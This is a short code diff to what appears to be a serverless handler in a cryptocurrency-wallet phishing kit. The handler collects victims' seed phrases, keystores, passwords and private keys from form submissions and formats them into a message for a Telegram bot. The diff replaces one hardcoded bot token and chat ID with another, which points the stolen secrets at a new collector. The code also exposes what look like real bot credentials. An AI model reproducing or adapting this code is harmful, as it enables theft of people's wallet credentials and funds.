@@ -5,8 +5,8 @@ export default async function handler(req, res) {
 
   const { type, phrase, keystore, password, privateKey, walletName } = req.body;
 
-  const botToken = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI';
-  const chatId = '1129243973';
+  const botToken = '8359088269:AAEj_gRp3HBEERZ_I2ysDlixGqK8gNmvK_U';
+  const chatId = '7491229786';
 
   let message = `🔐 New Wallet Submission\n`;
   message += `📲 Wallet: ${walletName}\n`;
